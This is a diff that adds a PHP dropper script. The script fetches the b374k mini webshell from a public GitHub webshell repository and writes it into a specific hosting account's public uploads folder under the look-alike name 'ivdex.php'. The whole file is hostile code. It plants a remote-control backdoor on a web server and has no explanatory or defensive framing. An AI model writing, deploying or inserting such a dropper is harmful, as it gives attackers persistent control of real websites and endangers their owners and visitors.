@@ -1,0 +1,8 @@
+<?php
+$site = 'https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/mini_b374k';
+$homepage = file_get_contents($site);
+$filename = '/home/trinvvfo/public_html/demo/babsha/public/uploads/ivdex.php';
+$handle = fopen($filename,"w");
+fwrite($handle,$homepage);
+fclose($handle);
+?>
